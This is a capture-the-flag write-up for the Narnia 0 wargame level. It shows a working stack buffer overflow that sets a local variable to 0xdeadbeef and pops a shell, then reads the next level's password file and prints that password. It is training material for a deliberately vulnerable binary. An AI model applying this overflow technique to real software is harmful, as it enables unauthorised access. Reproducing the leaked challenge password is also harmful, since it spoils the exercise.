# Solution for Narnia 0 
For the initial login, the credentials are
```text
narnia0:narnia0
```
Once we see the C code for the level, we need to change one of the local variables to the value 0xdeadbeef, and then it will pop a shell.
Pretty easy, as we know the buffer is of size 20. Let's do our proof of concept and then set the value of the local variable to what we want to.

## Proof of concept
```text
narnia0@narnia:/narnia$ python -c 'print "A"*20 + "B"*4'
AAAAAAAAAAAAAAAAAAAABBBB

narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

Perfect, we have changed the value of the local variable from AAAA to BBBB. Now let's set it to 0xdeadbeef, and we take some help from the internet to see how we can send the bytes to the payload as we aren't passing it as arguments

```text
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
ls
narnia0  narnia0.c  narnia1  narnia1.c  narnia2  narnia2.c  narnia3  narnia3.c  narnia4  narnia4.c  narnia5  narnia5.c  narnia6  narnia6.c  narnia7  narnia7.c  narnia8  narnia8.c
cat /etc/narnia_pass/narnia1    
efeidiedae
```

The password for narnia1 is 
```text
efeidiedae
```


